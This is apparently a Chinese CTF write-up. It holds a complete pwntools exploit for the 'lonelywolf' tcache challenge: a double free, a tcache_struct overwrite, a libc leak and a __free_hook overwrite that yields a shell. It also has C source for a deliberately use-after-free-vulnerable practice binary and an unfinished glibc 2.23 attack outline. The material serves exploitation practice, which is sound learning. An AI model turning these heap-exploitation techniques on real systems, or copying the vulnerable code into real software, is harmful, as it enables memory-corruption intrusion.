# pwn
## ciscn 2021 lonelywolf
libc-2.27.so
这道题目考察对tcache的理解。修改tcache_struct来绕过tcache的检查和限制。
```python
from hashlib import new
from pwn import *
# delete this line to connect remote 
context.log_level='debug'
context.terminal=['bash']
debug=1
gdb_script='''
attach {pid}
source loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''

# write gdb script,use source /tmp/{elf_name}_gdb to load.
def add_gdb_script(elf_name:str,script:str):
    with open("/tmp/{}_gdb".format(elf_name),'w') as f:
        f.write(script)

def ld_libc_source_path(arch:str,version:str):
    libc_source_path="libc/usr/src/glibc/glibc-{}/".format(version)
    if arch=="amd64":
        ld_path="./libc/lib/x86_64-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/x86_64-linux-gnu/libc-{}.so'.format(version)
    elif arch=="i386":
        ld_path="./libc/lib/i386-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/i386-linux-gnu/libc-{}.so'.format(version)
    libc_symbol_path=libc_path.replace("/lib/","/usr/lib/debug/lib/")
    return (ld_path,libc_path,libc_symbol_path,libc_source_path)

# load elf， change this
elf_name='lonelywolf'
elf=ELF(elf_name)
context.arch=elf.arch
# libc_start_main_got=elf.got['__libc_start_main']
elf_start=elf.entry


# load libc. default use system libc 
libc_path='/lib/x86_64-linux-gnu/libc.so.6'
ld_path='/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
# set libc version
libc_version="2.27"
# 注释这行使用系统glibc
ld_path,libc_path,libc_symbol_path,libc_source_path=ld_libc_source_path(context.arch,libc_version)
libc=ELF(libc_path)
libc_base=0

# patch elf
# os.system("patchelf --set-interpreter {} {}".format(ld_path,elf_name))
# os.system("patchelf --replace-needed libc.so.6 {} {}".format(libc_path,elf_name))
elf=ELF(elf_name)
remote_addr=['127.0.0.1',4000]
def libc_start_main_addr()->int:
    return libc_base+libc.symbols['__libc_start_main']
def system_addr()->int:
    return libc_base+libc.symbols["system"]
def sh_addr()->int:
    return libc_base+libc.search(b"/bin/sh").__next__()
def free_hook()->int:
    return libc_base+libc.symbols["__free_hook"]

if debug:
    p=process(elf_name)
else:
    p=remote(remote_addr[0],remote_addr[1])
    
# 注意remote的时候p是没有pid的，随便改个数字
add_gdb_script(elf_name,gdb_script.format(pid=p.pid,libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))

def add(size:int):
    p.recvuntil(b"choice: ")
    p.sendline(b"1")
    p.sendline(b"0")
    p.sendline(str(size))

def delete():
    p.recvuntil(b"choice: ")
    p.sendline(b"4")
    p.sendline(b"0")

def show():
    p.recvuntil(b"choice: ")
    p.sendline(b"3")
    p.sendline(b"0")

def edit(payload:bytes):
    p.recvuntil(b"choice: ")
    p.sendline(b"2")
    p.sendline(b"0")
    p.sendline(payload)



# double free
add(0x70)
delete()
edit(b"A"*0x10)
delete()

# leak heap base
show()
p.recvuntil("Content: ")
fd=u64(p.recvline()[:6].ljust(8,b'\x00'))

# malloc -> tcache_struct and change tcache chunk count
fd-=0x250
edit(p64(fd))
add(0x70)
add(0x70)
edit(p64(0xffffffffffffffff)*5)
delete()
show()
p.recvuntil("Content: ")
libc_base=u64(p.recvline()[:6].ljust(8,b'\x00'))
libc_base-=0x3ebca0
print(hex(libc_base))

# get unsorted bin and set tcache entry
add(0x60)
edit(p64(0xffffffffffffff00)*8+p64(0))

# malloc -> free_hook -8
add(0x10)
delete()
edit(p64(free_hook()-8))
add(0x10)
add(0x10)

# write free_hook to system
edit(b"/bin/sh\x00"+p64(system_addr()))

# free ->getshell
delete()
p.interactive()
```
## heap-uaf
这道题目是uaf练习题目，没有做很多限制，可以尝试在不同glibc版本不同限制情景下的攻击。
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

size_t sizearray[20];
char *heaparray[20];

void myinit()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void menu()
{
    puts("1.add");
    puts("2.edit");
    puts("3.delete");
    puts("4.show");
    puts("5.exit");
    puts("choice> ");
}

void add()
{
    int i;
    int size;
    char temp[8];
    puts("index?");
    read(0, temp, 8);
    i = atoi(temp);
    if (i > 20)
        exit(0);
    puts("size?");
    read(0, temp, 8);
    size = atoi(temp);
    if (size > 0 && size < 0x500)
        sizearray[i] = size;
    else
        exit(0);
    char *p = malloc(size);
    heaparray[i] = p;
    puts("content:");
    read(0, p, size);
}

void edit()
{
    int i;
    char temp[8];
    puts("index?");
    read(0, temp, 8);
    i = atoi(temp);
    if (heaparray[i])
    {
        puts("content:");
        read(0, heaparray[i], sizearray[i]);
    }
}

void show()
{
    int i;
    char temp[8];
    puts("index?");
    read(0, temp, 8);
    i = atoi(temp);
    if (heaparray[i])
        puts(heaparray[i]);
}

void delete ()
{
    int i;
    char temp[8];
    puts("index?");
    read(0, temp, 8);
    i = atoi(temp);
    if (heaparray[i])
        free(heaparray[i]);
}

int main()
{
    int choice;
    myinit();
    menu();
    scanf("%d", &choice);
    while (1)
    {
        if (choice == 1)
            add();
        if (choice == 2)
            edit();
        if (choice == 3)
            delete ();
        if (choice == 4)
            show();
        if (choice == 5)
            exit(0);
        menu();
        scanf("%d", &choice);
    }
    return 0;
}
```
### 2.23
1. 通过unsorted bin uaf来泄露glibc地址
2. fastbin修改到got或者 __free_hook 来getshell
3. 
